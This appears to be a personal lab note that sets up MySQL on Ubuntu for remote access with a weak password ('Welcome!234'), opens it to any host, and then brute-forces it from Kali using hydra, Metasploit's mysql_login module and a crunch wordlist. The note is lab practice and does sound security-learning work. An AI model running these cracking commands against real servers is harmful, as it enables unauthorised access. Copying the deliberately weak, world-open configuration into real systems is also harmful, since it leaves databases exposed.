# Server - Database: `mysql` on `Ubuntu`

[Back](../../index.md)

- [Server - Database: `mysql` on `Ubuntu`](#server---database-mysql-on-ubuntu)
  - [Install MySQL Package](#install-mysql-package)
  - [Configure MySQL](#configure-mysql)
  - [Enable Remote Access](#enable-remote-access)
  - [Brute Force cracking MySQL](#brute-force-cracking-mysql)
  - [WordList](#wordlist)

---

## Install MySQL Package

- Pre-install: update repo

```sh
# Update the System
sudo apt update
sudo apt upgrade -y
```

- Install package

```sh
# Install MySQL Server
apt install mysql-server -y

# verify if the MySQL package is installed
dpkg -l | grep mysql-server
# ii  mysql-server                                  8.0.40-0ubuntu0.24.04.1                  all          MySQL database server (metapackage depending on the latest version)
# ii  mysql-server-8.0                              8.0.40-0ubuntu0.24.04.1                  amd64        MySQL database server binaries and system database setup
# ii  mysql-server-core-8.0                         8.0.40-0ubuntu0.24.04.1                  amd64        MySQL database server binaries

# confirm the package installation
apt list --installed | grep mysql-server
# mysql-server-8.0/noble-updates,noble-security,now 8.0.40-0ubuntu0.24.04.1 amd64 [installed,automatic]
# mysql-server-core-8.0/noble-updates,noble-security,now 8.0.40-0ubuntu0.24.04.1 amd64 [installed,automatic]
# mysql-server/noble-updates,noble-security,now 8.0.40-0ubuntu0.24.04.1 all [installed]

mysql --version
# mysql  Ver 8.0.40-0ubuntu0.24.04.1 for Linux on x86_64 ((Ubuntu))
```

- Start service

```sh
# Check the status of the MySQL service
systemctl start mysql
systemctl enable mysql
systemctl status mysql
# ● mysql.service - MySQL Community Server
#      Loaded: loaded (/usr/lib/systemd/system/mysql.service; enabled; preset: enabled)
#      Active: active (running) since Tue 2024-12-31 22:51:50 EST; 37min ago
#     Process: 1097 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=exited, status=0/SU>
#    Main PID: 1317 (mysqld)
#      Status: "Server is operational"
#       Tasks: 37 (limit: 4558)
#      Memory: 421.8M (peak: 434.8M)
#         CPU: 24.313s
#      CGroup: /system.slice/mysql.service
#              └─1317 /usr/sbin/mysqld

# Dec 31 22:51:46 ubuntuhost systemd[1]: Starting mysql.service - MySQL Community Server...
# Dec 31 22:51:50 ubuntuhost systemd[1]: Started mysql.service - MySQL Community Server.
# lines 1-14/14 (END)
```

---

## Configure MySQL

```sh
#  Secure MySQL Installation
sudo mysql_secure_installation
```

- Login

```sh
mysql -u root -p
```

- Initiate database

```sql
-- Create a new database:
CREATE DATABASE app_db;

-- Create a new user and grant them privileges
-- @'%' part allows access from any IP address
CREATE USER 'app_admin'@'%' IDENTIFIED BY 'Welcome!234';
GRANT ALL PRIVILEGES ON app_db.* TO 'app_admin'@'%';
FLUSH PRIVILEGES;

-- Exit the MySQL shell:
EXIT;
```

---

## Enable Remote Access

- Configure Firewall

```sh
# Allow MySQL through the firewall
ufw allow mysql

ufw status
# Status: active

# To                         Action      From
# --                         ------      ----
# 3306/tcp                   ALLOW       Anywhere
# 22                         ALLOW       Anywhere
# Samba                      ALLOW       Anywhere
# 3306/tcp (v6)              ALLOW       Anywhere (v6)
# 22 (v6)                    ALLOW       Anywhere (v6)
# Samba (v6)                 ALLOW       Anywhere (v6)

# Edit the MySQL configuration to allow remote access
sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
# replace
# bind-address = 0.0.0.0

sudo systemctl restart mysql
```

---

## Brute Force cracking MySQL

- In kali

```sh
hydra mysql://192.168.1.200 -l root -P /usr/share/nmap/nselib/data/passwords.lst -v

hydra -l app_admin -p 'Welcome!234' 192.168.1.200 mysql
hydra -l root -p 'Welcome!234' 192.168.1.200 mysql
hydra -l app_admin -p 'Welcome!234' mysql://192.168.1.200

hydra 192.168.1.200 mysql -L /home/kali/username_list.txt -P /home/kali/password_list.txt -o /home/kali/credential.txt
```

- Metasploit Framework

```sh
# Open Metasploit:
msfconsole

# Search for MySQL Exploits:
search mysql

# Use a Module for Exploitation
use auxiliary/scanner/mysql/mysql_login

# Set Parameters:
set RHOSTS 192.168.1.200
set USERNAME root
set PASS_FILE /usr/share/nmap/nselib/data/passwords.lst
set THREADS 5

# Run the Exploit:
run
```

---

## WordList

- Using `Crunch`

```sh
sudo apt-get install crunch

crunch 6 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_- > username_list.txt
```